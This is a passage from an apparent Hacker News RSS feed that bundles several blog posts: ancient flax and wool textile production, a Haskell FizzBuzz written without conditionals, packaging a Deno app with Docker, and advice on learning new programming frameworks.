<figure><img data-attachment-id="6453" data-permalink="https://acoup.blog/616302001/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg" data-orig-size="2218,1817" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="616302001" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg?w=2048 2048w, https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/03/616302001.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://www.britishmuseum.org/collection/object/G_1814-0704-573">From the British Museum</a>, a fourth century bell krater depicting the Judgement of Paris (which in turn leads to the Trojan War).  Paris, at the time, was living in exile as a shepherd – the occupation notable because of its lowly status.  Here he is seen seated with his shepherd’s crook (the standing male figure is Hermes); the animal below Paris is a sheep (you can see the twisted horns; to the right is a dog, presumably assisting in the herding.</figcaption></figure>



<p>Worry not, we will have more than enough to talk about with just those two fibers.  This week, we’re going to focus just on producing the raw fibers – how flax is farmed and how wool is produced from sheep.  Next week, we’ll look at the long process of taking those raw fibers, processing them and spinning them into thread.  The week after that, we’ll look at weaving as well as dying, bleaching and other color treatments treatments.  Then finally in the last week, we’ll look at finally sewing but also at markets and trade. <strong> As always, we’ll try to direct attention not only to the processes, but also to the workers who <em>performed</em> those processes and their place in the broader society.</strong></p>



<p>And that brings us to the second reason to discuss textile production, which is that in the broader pre-modern Mediterranean <strong>much of the textile production</strong> <strong>was done within the household and nearly all of that household production was done by women</strong>.  Now as we’ll see, household spinning, weaving and sewing is by no means the only jobs involved in the production of the clothes that say an Egyptian, Babylonian, Roman or early Medieval European family would wear and some important stages of production here were also generally done by men.  As I have mentioned before, the literary sources for the pre-modern world generally prefer to talk about individuals who are rich, male, and free, but as we will see, the workers involved in each stage of textile production are almost never rich, frequently not male and sometimes not free.  Nevertheless investigating textile production gives us a chance to peer into parts of the lives of some historical subjects that we very rarely hear about: women (rich and poor, slave and free), along with enslaved or poor men doing work that left them well outside of the ‘polite society’ of our literary sources.</p>



<p>I should note at the beginning that while I am going to try to keep this discussion general and at points cover technological or regional variations in how textiles in wool and linen were made, in practice a lot of what I am going to write here is going to reflect in particular practice during the Roman period (especially the period of the Republic) and even more specifically than that in Roman Italy, simply because that is where my own specialist knowledge is best.  Consult your friendly neighborhood primary sources when looking to apply these systems on a wider basis either geographically or chronologically!</p>



<p>As always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<p>(<strong>Bibliography Note:</strong> For the sake of keeping these posts readable, especially since I don’t have a footnote function here, I am not going to laboriously cite everything at each point of reference, but instead I’m going to include a short selected bibliography here up front for the whole series.  For the beginner looking to get their feet under themselves when it comes to pre-modern textile production, E.W. Barber, <em>Women’s Work: The First 20,000 Years, Women, Cloth and Society in Early Times</em> (1994) is the standard starting point.  Also note E.W. Barber, <em>Prehistoric Textiles: The Development of Cloth in the Neolithic and Bronze Ages with Special Reference to the Aegean</em> (1991).  More specific to the Romans, M. Gleba, <em>Textile Production in Pre-Roman Italy</em> (2008) is an indispensable book which gathers together a lot of the quite technical investigation – often done by archaeologists rather than historians because the literary record on textile production can be quite disappointing – in a fairly easy to read location.  Several of the essays in M. Gleba and J. Pásztókai-Szeöke <em>Making Textiles in Pre-Roman Times and Roman Times: People, Places, Identities</em> (2013), while more technical in nature, were also useful here, especially on the question of who did this sort of thing.  Also on this point, L. L. Lovén, <em>The Imagery of Textile Making: Gender and Status in the Funerary Iconography of Textile Manufacture in Roman Italy and Gaul</em> (2002).  On textile production for soldiers, note in the Greek context G.S. Aldrete, S. Bartel and A. Aldrete, <em>Reconstructing Ancient Linen Body Armor: Unraveling the Linothorax Mystery</em>(2013) which also has some very useful time-labor study data; for Roman soldiers note the essays in M.L. Nosch ed., <em>Wearing the Cloak: Dressing the Soldier in Roman Times</em> (2012) and G. Sumner, <em>Roman Military Dress </em>(2009).  On the cloth trade in medieval Europe, I’ve relied heavily on J.S. Lee, <em>The Medieval Clothier</em> (2018).</p>



<p>If it sounds like pre-modern textile production is one of those fields that is only now, somewhat belatedly receiving the attention it has long deserved, that is by and large correct!  As you can see, compared to the discussion of farming or iron-working, the key references here are often decades younger (one is left to assume that it is something to do with the fact that this work was largely done by women that led to it being so late to receive its due study).  Fortunately, archaeology is giving us a lot of the evidence that our literary sources don’t, especially for the ancient world, which has enabled a lot of this work.  May it continue!)</p>



<h2>Meet the Fibers! Flax and Linen</h2>



<p>Linen fabrics are produced from the fibers of the flax plant, <em>Linum usitatissimum</em>.  This common flax plant is the domesticated version of the wild <em>Linum bienne</em>, domesticated in the northern part of the fertile crescent no later than 7,000 BC, although wild flax fibers were being used to produce textiles even earlier than that. Consequently the use of linen fibers goes <em><strong>way </strong></em>back. In fact, the oldest known textiles are made from flax, including finds of fibers at Nahal Hemar (7th millennium BC), Çayönü (c. 7000 BC), and Çatalhöyük (c. 6000 BC). Evidence for the cultivation of flax goes back even further, with linseed from Tell Asward in Syria dating to the 8th millennium BC. Flax was being cultivated in Central Europe no later than the second half of the 7th millennium BC.</p>



<figure><img data-attachment-id="6451" data-permalink="https://acoup.blog/linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/03/linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088.jpg" data-orig-size="439,591" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/03/linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088.jpg?w=223" data-large-file="https://acoupdotblog.files.wordpress.com/2021/03/linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088.jpg?w=439" src="https://acoupdotblog.files.wordpress.com/2021/03/linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088.jpg?w=439" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/03/linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088.jpg 439w, https://acoupdotblog.files.wordpress.com/2021/03/linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088.jpg?w=111 111w, https://acoupdotblog.files.wordpress.com/2021/03/linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088.jpg?w=223 223w" sizes="(max-width: 439px) 100vw, 439px"><figcaption><a href="https://en.wikipedia.org/wiki/Flax">Via Wikipedia</a>, the flax plant, showing the seeds and – more importantly for our purpose – the stalk which, when fully grown contains the bast fibers used to make linen.</figcaption></figure>



<p>Flax is a productive little plant that produces two main …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2021/03/05/collections-clothing-how-did-they-make-it-part-i-high-fiber/">https://acoup.blog/2021/03/05/collections-clothing-how-did-they-make-it-part-i-high-fiber/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2021/03/05/collections-clothing-how-did-they-make-it-part-i-high-fiber/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26355046</guid>
            <pubDate>Fri, 05 Mar 2021 10:02:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fizzbuzz Without If Clauses]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26353967">thread link</a>) | @beny23
<br/>
March 4, 2021 | https://beny23.github.io/posts/fizzbuzz_without_ifs/ | <a href="https://web.archive.org/web/*/https://beny23.github.io/posts/fizzbuzz_without_ifs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://beny23.github.io/images/fizzbuzz_without_ifs_title.png" alt=""></p><p>In this writing I aim to complete a Fizzbuzz without if statements, conditionals, pattern matching
or even using modulus calculations. And if that isn’t enough I thought I’d use the opportunity
to explore <a href="https://www.haskell.org/">Haskell</a>.</p><p>The idea originated in the Friday lunchtime “Curry Club” at HMRC Digital where a few like-minded software engineers
are getting together to teach themselves Haskell. (For those not in on the joke, the language is named
after the logician Haskell Curry). At one of those sessions, talking about ifs and conditionals the
challenge was posited that a Fizzbuzz can be done without ifs.</p><p>A Fizzbuzz test is a fairly common programming challenge, often used to evaluate a developer’s
skill level. The basic instructions are as follows</p><blockquote><p>Write a class that produces the following for any contiguous range of integers:</p><p>the number</p><ul><li>‘fizz’ for numbers that are multiples of 3</li><li>‘buzz’ for numbers that are multiples of 5</li><li>‘fizzbuzz’ for numbers that are multiples of 15</li></ul><p>e.g. Running the program with a range from 1-20 should produce the following result:</p><p><code>1 2 fizz 4 buzz fizz 7 8 fizz buzz 11 fizz 13 14 fizzbuzz 16 17 fizz 19 buzz</code></p></blockquote><p>Now, I’ve marked a fair number of fizzbuzz challenges in my time and the most important piece of
advice is: Keep it simple!</p><p>Under normal condition, the following pseudo code lends itself to the better solutions:</p><pre><code>if (number is multiple of 15) print "fizzbuzz"
else if (number is multiple of 5) print "fizz"
else if (number is multiple of 3) print "buzz"
else print number
</code></pre><p>It does not try to be clever (many candidates fall down because they want to show off the latest
shiny technique, but technical interviewers wouldn’t be looking to that) and does the job. Simple!</p><p>So how could this be achieved without if clauses or using modulo calculations? I would class
pattern matching as cheating here, so the following scala snippet would also be disqualified:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span></code></pre></td><td><pre><code data-lang="scala">scala<span>&gt;</span> <span>(</span><span>1</span> to <span>20</span><span>).</span>map <span>{</span>
     <span>|</span> <span>case</span> n <span>if</span> n <span>%</span> <span>15</span> <span>==</span> <span>0</span> <span>=&gt;</span> <span>"fizzbuzz"</span>
     <span>|</span> <span>case</span> n <span>if</span> n <span>%</span> <span>5</span> <span>==</span> <span>0</span> <span>=&gt;</span> <span>"buzz"</span>
     <span>|</span> <span>case</span> n <span>if</span> n <span>%</span> <span>3</span> <span>==</span> <span>0</span> <span>=&gt;</span> <span>"fizz"</span>
     <span>|</span> <span>case</span> n <span>=&gt;</span> n<span>.</span>toString
     <span>|</span> <span>}</span>
res0 <span>=</span> <span>Vector</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>,</span> fizz<span>,</span> <span>4</span><span>,</span> buzz<span>,</span> fizz<span>,</span> <span>7</span><span>,</span> <span>8</span><span>,</span> fizz<span>,</span> buzz<span>,</span> <span>11</span><span>,</span> fizz<span>,</span> <span>13</span><span>,</span> <span>14</span><span>,</span> fizzbuzz<span>,</span> <span>16</span><span>,</span> <span>17</span><span>,</span> fizz<span>,</span> <span>19</span><span>,</span> buzz<span>)</span>
scala<span>&gt;</span>
</code></pre></td></tr></tbody></table></div></div><p>I’ll just go ahead and show what I ended up coming up with:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td><td><pre><code data-lang="haskell"><span>Prelude</span><span>&gt;</span> replace n v xs <span>=</span> zipWith (<span>$</span>) (cycle ((replicate (n<span>-</span><span>1</span>) (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> v])) xs
<span>Prelude</span><span>&gt;</span> replace <span>15</span> <span>"fizzbuzz"</span> <span>.</span> replace <span>5</span> <span>"buzz"</span> <span>.</span> replace <span>3</span> <span>"fizz"</span> <span>$</span> map show [<span>1</span><span>..</span><span>20</span>]
[<span>"1"</span>,<span>"2"</span>,<span>"fizz"</span>,<span>"4"</span>,<span>"buzz"</span>,<span>"fizz"</span>,<span>"7"</span>,<span>"8"</span>,<span>"fizz"</span>,<span>"buzz"</span>,<span>"11"</span>,<span>"fizz"</span>,<span>"13"</span>,<span>"14"</span>,<span>"fizzbuzz"</span>,<span>"16"</span>,<span>"17"</span>,<span>"fizz"</span>,<span>"19"</span>,<span>"buzz"</span>]
</code></pre></td></tr></tbody></table></div></div><p>Now I will break it down. The intuition was that I would be able to use a method loosely (very loosely)
inspired by the Sieve of Eratosthenes, whereby I would create lists of functions that would replace
every 3rd element by “fizz”, every 5th element by “buzz” and every 15th element by “fizzbuzz”.</p><p>So essentially what I was after are lists like so</p><pre><code>["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", ...]
["", "", "fizz", "", "", "fizz", "", "", "fizz", "", "", "fizz", "", "", "fizz", ...]
["", "", "",     "", "buzz", "", "", "", "",     "buzz", "", "", "", "", "buzz", ...]
["", "", "",     "", "",     "", "", "", "",     "",     "", "", "", "", "fizzbuzz", ...]
</code></pre><p>where any non-empty values replace the values in the previous list. To do so, I use a mixture
of <code>replicate</code> and <code>cycle</code>.</p><div><div><table><tbody><tr><td><pre><code><span>1
</span></code></pre></td><td><pre><code data-lang="haskell">(replicate (n<span>-</span><span>1</span>) (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> v]
</code></pre></td></tr></tbody></table></div></div><p>This creates a list where the <code>id</code> function repeated <code>n-1</code> times followed by a lambda that ignores the
input and just replaces it with a value. So if a call this with <code>n=3</code> and <code>v="fizz"</code>, what I get is:</p><pre><code>[id, id, \x -&gt; v]
</code></pre><p>Then I use the <code>cycle</code> function to create an infinite repeating list. This makes use of the fact that
Haskell is lazily evaluated, meaning that I list can be defined as infinite but its constituent elements
are not created until they’re used, so:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span></code></pre></td><td><pre><code data-lang="haskell"><span>cycle</span> [id, id, <span>\</span>x <span>-&gt;</span> v] <span>=</span> 
  [id, id, <span>\</span>x <span>-&gt;</span> v, id, id, <span>\</span>x <span>-&gt;</span> v, id, id, <span>\</span>x <span>-&gt;</span> v, id, id, <span>\</span>x <span>-&gt;</span> v, <span>...</span>]
</code></pre></td></tr></tbody></table></div></div><p>This gives me my <code>replace</code> function:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span></code></pre></td><td><pre><code data-lang="haskell"><span>replace</span> n v xs <span>=</span> zipWith (<span>$</span>) (cycle ((replicate (n<span>-</span><span>1</span>) (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> v])) xs
</code></pre></td></tr></tbody></table></div></div><p>whereby <code>zipWith ($) listOfFunctions values</code> creates a new list that applies the first function to
the first value, second function to the second value, etc, so, if call this with <code>n=6</code> and <code>v="fizz"</code>
and <code>xs=[1..6]</code>, the following substitutions can be made:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span></code></pre></td><td><pre><code data-lang="haskell"><span>zipWith</span> (<span>$</span>) (cycle ((replicate (n<span>-</span><span>1</span>) (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> v])) xs
<span>zipWith</span> (<span>$</span>) (cycle ((replicate <span>2</span> (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> <span>"fizz"</span>])) [<span>"1"</span><span>..</span><span>"6"</span>]
<span>zipWith</span> (<span>$</span>) (cycle [id, id, <span>\</span>x <span>-&gt;</span> v]) [<span>"1"</span><span>..</span><span>"6"</span>]
<span>zipWith</span> (<span>$</span>) [id, id, <span>\</span>x <span>-&gt;</span> v, id, id, <span>\</span>x <span>-&gt;</span> v] [<span>"1"</span><span>..</span><span>"6"</span>]
[id <span>$</span> <span>"1"</span>, id <span>$</span> <span>"2"</span>, <span>"3"</span> <span>-&gt;</span> <span>"fizz"</span>, id <span>$</span> <span>"4"</span>, id <span>$</span> <span>"5"</span>, <span>"6"</span> <span>-&gt;</span> <span>"fizz"</span>]
[<span>"1"</span>, <span>"2"</span>, <span>"fizz"</span>, <span>"4"</span>, <span>"5"</span>, <span>"fizz"</span>]
</code></pre></td></tr></tbody></table></div></div><p>So to put it all together, we then want to replace all the “fizz”, “buzz” and “fizzbuzz” entries in
our list, to do that I think the dot operator in Haskell makes for nice reading:</p><p>so the snippet</p><div><div><table><tbody><tr><td><pre><code><span>1
</span></code></pre></td><td><pre><code data-lang="haskell"><span>replace</span> <span>15</span> <span>"fizzbuzz"</span> <span>.</span> replace <span>5</span> <span>"buzz"</span> <span>.</span> replace <span>3</span> <span>"fizz"</span>
</code></pre></td></tr></tbody></table></div></div><p>just creates a single function that first replaces all the “fizz”, then “buzz”, then “fizzbuzz”</p><p>Finally, we’ve got our list of numbers. But in this case we don’t actually want a list of numbers,
as our <code>replace</code> function is expecting strings, so the following creates our list of string
by using the <code>show</code> function</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span></code></pre></td><td><pre><code data-lang="haskell"><span>Prelude</span><span>&gt;</span> map show [<span>1</span><span>..</span><span>20</span>]
[<span>"1"</span>,<span>"2"</span>,<span>"3"</span>,<span>"4"</span>,<span>"5"</span>,<span>"6"</span>,<span>"7"</span>,<span>"8"</span>,<span>"9"</span>,<span>"10"</span>,<span>"11"</span>,<span>"12"</span>,<span>"13"</span>,<span>"14"</span>,<span>"15"</span>,<span>"16"</span>,<span>"17"</span>,<span>"18"</span>,<span>"19"</span>,<span>"20"</span>]
</code></pre></td></tr></tbody></table></div></div><p>We just combine the function with our list and there’s the Fizzbuzz answer:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td><td><pre><code data-lang="haskell"><span>Prelude</span><span>&gt;</span> replace n v xs <span>=</span> zipWith (<span>$</span>) (cycle ((replicate (n<span>-</span><span>1</span>) (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> v])) xs
<span>Prelude</span><span>&gt;</span> replace <span>15</span> <span>"fizzbuzz"</span> <span>.</span> replace <span>5</span> <span>"buzz"</span> <span>.</span> replace <span>3</span> <span>"fizz"</span> <span>$</span> map show [<span>1</span><span>..</span><span>20</span>]
[<span>"1"</span>,<span>"2"</span>,<span>"fizz"</span>,<span>"4"</span>,<span>"buzz"</span>,<span>"fizz"</span>,<span>"7"</span>,<span>"8"</span>,<span>"fizz"</span>,<span>"buzz"</span>,<span>"11"</span>,<span>"fizz"</span>,<span>"13"</span>,<span>"14"</span>,<span>"fizzbuzz"</span>,<span>"16"</span>,<span>"17"</span>,<span>"fizz"</span>,<span>"19"</span>,<span>"buzz"</span>]
</code></pre></td></tr></tbody></table></div></div><p>In summary, I’ve tried to get an alternative view on how a Fizzbuzz can be implemented, without
using the traditional tools. Now, if I’m honest, if I were to mark such a submission, I would be disappointed
that it doesn’t allow me to use arbitrary ranges. My solution above would not provide the correct answer
for a range that doesn’t start with 1.</p><p>This was a fun exercise and hope will give you some food for thought.</p><p><a href="https://news.ycombinator.com/item?id=26353967">Discuss on Hackernews</a></p><ul></ul></div></div>]]>
            </description>
            <link>https://beny23.github.io/posts/fizzbuzz_without_ifs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26353967</guid>
            <pubDate>Fri, 05 Mar 2021 07:42:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Packaging a Deno App with Docker]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26353659">thread link</a>) | @craig
<br/>
March 4, 2021 | https://hobochild.com/posts/deno-demo.html | <a href="https://web.archive.org/web/*/https://hobochild.com/posts/deno-demo.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><a href="https://hobochild.com/"><svg id="i-arrow-left" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 28" width="32" height="14" zindex="1" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
        <path d="M10 6 L2 16 10 26 M2 16 L30 16"></path>
    </svg>Home</a><p>I’ve been following <a href="https://deno.land/">deno</a> from a far for a while now, I’m particularly interested in it for two reasons.</p><ol><li>First class typescript support - I hate having to compile things with babel or webpack and then having to run them via node in production it always ends-up being a little brittle &amp; complicated with everyone having their own home grown scripts and workflows for dev and production.</li><li>Compiled executables - Scripting languages are really neat for making little tools, but they are pretty hard to distribute. For that reason I’ve been using Go for <a href="https://hobochild.com/#tools">small utilities</a>, but I’d much prefer to write these tools in something like python or javascript.</li></ol><p>So I thought I’d dip my toes in and see how a packaged app would look. Deno has fairly unique dependency story compared to javascript’s npm ecosystem. It pulls dependencies from remote urls on first run and then caches them until you clear the cache, very similar to how a browser loads a webpages dependencies.</p><blockquote><p>If you want to skip the rest and just check out the code it can be found 👉 <a href="https://github.com/hobochild/deno-demo">here</a></p></blockquote><p>The first thing to figure out was how to create a reproducible build, turned out to be fairly easy you can create a lock file with:</p><pre><code><pre>deno cache --lock<span>=</span>lock.json --lock-write src/deps.ts
</pre></code></pre><p>And then install with that lock file using:</p><pre><code><pre>deno cache --reload --lock<span>=</span>lock.json src/deps.ts
</pre></code></pre><p>The next was how to make that build as small as possible, I did this by using deno’s compile feature which can cross-compile standalone binaries (quite similar to vercel’s <a href="https://www.npmjs.com/package/pkg">pkg</a>). The linux executable is dynamically linked with <code>glibc</code> so you’ll that present, luckily most systems have this. I unfortunately encountered the issue because I tried to use the vanilla apline image.</p><p>The results:</p><p><a href="https://github.com/hobochild/deno-demo">The code</a> is fairly self explanatory. It’s a <a href="https://github.com/hobochild/deno-demo/Dockerfile">multi-stage docker build</a> for a bare-bones <code>oak</code> server (comparable to node.js’s express). There are 3 useful make targets.</p><ol><li><code>make size_uncompressed</code> - this will give you the <a href="https://hobochild.com/posts/ondisk">ondisk</a> size of the image.</li></ol><p>The on disk size comes out a 53.3mb (30mb of this is your executable) the rest is the apline image. (Node apline image is 116MB)</p><ol><li><code>make size_compressed</code> - This will give you the gzipped image size which should be comparable to what you’d pull from a registry.</li></ol><p>The compressed size comes in at 21mb, the node.js apline image by comparison is 38.93 MB</p><ol><li><code>make run</code> - run the server.</li></ol><p>My little experience with deno has been very positive so far. I really like how it’s cleaning up typescript &amp; javascript’s disparate ecosystem and creating a uniform toolkit for building software.</p><p>Next I’m looking forward to try out their built in test framework too see how that fairs against more established things like jest.</p></div></div>]]>
            </description>
            <link>https://hobochild.com/posts/deno-demo.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26353659</guid>
            <pubDate>Fri, 05 Mar 2021 06:50:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mistakes to Avoid When Learning a New Framework or Programming Language]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26353601">thread link</a>) | @eisabai
<br/>
March 4, 2021 | https://betterprogramming.pub/5-mistakes-to-avoid-when-learning-a-new-framework-or-programming-language-a8ba9c3f1160 | <a href="https://web.archive.org/web/*/https://betterprogramming.pub/5-mistakes-to-avoid-when-learning-a-new-framework-or-programming-language-a8ba9c3f1160">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><h2 id="dece">Be vigilant by understanding pivotal learning mistakes</h2><div><div><div><div><a href="https://eisabai.medium.com/?source=post_page-----a8ba9c3f1160--------------------------------" rel="noopener"><div><p><img alt="Isabel Nyo" src="https://miro.medium.com/fit/c/96/96/1*BGXgVWhH-nqrX6VruxEvmA.jpeg" width="48" height="48"></p></div></a></div></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of half an archway close to housing" src="https://miro.medium.com/max/8292/0*el9ezXeq8AVyn7L2" width="4146" height="3006" srcset="https://miro.medium.com/max/552/0*el9ezXeq8AVyn7L2 276w, https://miro.medium.com/max/1104/0*el9ezXeq8AVyn7L2 552w, https://miro.medium.com/max/1280/0*el9ezXeq8AVyn7L2 640w, https://miro.medium.com/max/1400/0*el9ezXeq8AVyn7L2 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*el9ezXeq8AVyn7L2?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@gruu?utm_source=medium&amp;utm_medium=referral" rel="noopener">Anna Gru</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="a44e">Learning, upskilling, and staying in touch with the latest technology and trends are a part of any software developer’s life. They are not optional extras but are vital to the successful achievement of their career goals. However, there are some common learning mistakes that developers often make regardless of where they are currently in their careers.</p><p id="ed23">The common learning mistakes are:</p><ol><li id="bcd6">Not having a learning plan.</li><li id="cb91">Not setting a clear end goal.</li><li id="fd0d">Choosing too broad a topic.</li><li id="406e">Having a consumption overload.</li><li id="ffb4">Not keeping track of progress.</li></ol></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of person on laptop" src="https://miro.medium.com/max/11520/0*ZdqNg4jjyniaoCe2" width="5760" height="3840" srcset="https://miro.medium.com/max/552/0*ZdqNg4jjyniaoCe2 276w, https://miro.medium.com/max/1104/0*ZdqNg4jjyniaoCe2 552w, https://miro.medium.com/max/1280/0*ZdqNg4jjyniaoCe2 640w, https://miro.medium.com/max/1400/0*ZdqNg4jjyniaoCe2 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*ZdqNg4jjyniaoCe2?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@chuklanov?utm_source=medium&amp;utm_medium=referral" rel="noopener">Avel Chuklanov</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="7042">There is a saying that if you fail to plan, you plan to fail, and this applies to learning too. Sometimes, developers get impatient and plunge straight into active learning without any preparation. For example, a developer might say they want to learn a JavaScript framework, React. They may start reading tutorials about React without any outline on what areas they want to focus on, or how to get to their end goal: being able to write React applications.</p><p id="6916">The better way of learning, in this case, will be looking at the official documentation, going through the step-by-step approach from main concepts to advanced guides and API references, and creating a sample application in React. After this, looking at and learning from other examples out there and setting SMART goals for each stage of their learning will be helpful. S.M.A.R.T. goals are good goals because they’re specific, measurable, achievable, realistic, and time-bound.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of a bullseye" src="https://miro.medium.com/max/10336/0*ycA_TuwSGX-DwcOr" width="5168" height="3448" srcset="https://miro.medium.com/max/552/0*ycA_TuwSGX-DwcOr 276w, https://miro.medium.com/max/1104/0*ycA_TuwSGX-DwcOr 552w, https://miro.medium.com/max/1280/0*ycA_TuwSGX-DwcOr 640w, https://miro.medium.com/max/1400/0*ycA_TuwSGX-DwcOr 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*ycA_TuwSGX-DwcOr?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@enginakyurt?utm_source=medium&amp;utm_medium=referral" rel="noopener">engin akyurt</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="1985">There are so many new technologies and new ways of doing things in the <a href="https://hackernoon.com/tagged/software-development" rel="noopener">software development</a> industry. Don’t get me wrong; I believe continuous learning is a good thing. You can only grow your skill set and knowledge if you are open to learning. However, if a developer has too much FOMO (Fear of Missing Out) about learning every new thing that they hear about — then there will be no time left for being productive or putting her knowledge and skills to good use.</p><p id="bcfd">Before you learn something, I’d encourage you to think about why you’re learning it — and where and how you’ll use your newly learned knowledge or skill. For example, if you’re a backend developer, and you’re learning JavaScript, you’re doing so because your goal is to move to full-stack development. Or, if you’re a DevOps and learning AWS, you might be doing so to increase your chance of a new employment opportunity at a company that uses AWS.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of the sea and sky." src="https://miro.medium.com/max/12408/0*bfFnMGfMLjIakmKq" width="6204" height="4136" srcset="https://miro.medium.com/max/552/0*bfFnMGfMLjIakmKq 276w, https://miro.medium.com/max/1104/0*bfFnMGfMLjIakmKq 552w, https://miro.medium.com/max/1280/0*bfFnMGfMLjIakmKq 640w, https://miro.medium.com/max/1400/0*bfFnMGfMLjIakmKq 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*bfFnMGfMLjIakmKq?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@mattmaber?utm_source=medium&amp;utm_medium=referral" rel="noopener">Matthew Maber</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="aa08">Ever heard of the saying — everything but the kitchen sink? Sometimes, developers get too greedy with wanting to know everything about a topic that they fail to narrow down and, instead, set a very broad learning objective. How broad is too broad, I hear you ask. In 